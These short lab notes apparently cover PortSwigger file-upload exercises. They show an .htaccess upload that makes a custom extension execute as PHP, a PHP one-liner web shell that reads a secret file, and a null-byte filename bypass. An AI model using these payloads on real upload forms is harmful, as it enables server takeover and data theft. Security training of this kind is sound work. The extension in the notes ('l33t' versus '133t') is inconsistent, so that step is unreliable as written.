# Web shell upload via extension blacklist bypass

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

1. Upload `.php` file --> blocked

2. Upload `.htaccess` file with content: `AddType application/x-httpd-php .l33t` to overwrite the config in upload folder

3. Upload `test.133t` with content: `<?php echo file_get_contents('/home/carlos/secret'); ?>` to get the flag.

# Bypass whitelist extension with Null byte

Upload avatar only allowed .png and .jpg

PHP 5.3.4 < Vulnerable to null byte injection

*file name*: `test.php%00.jpg`
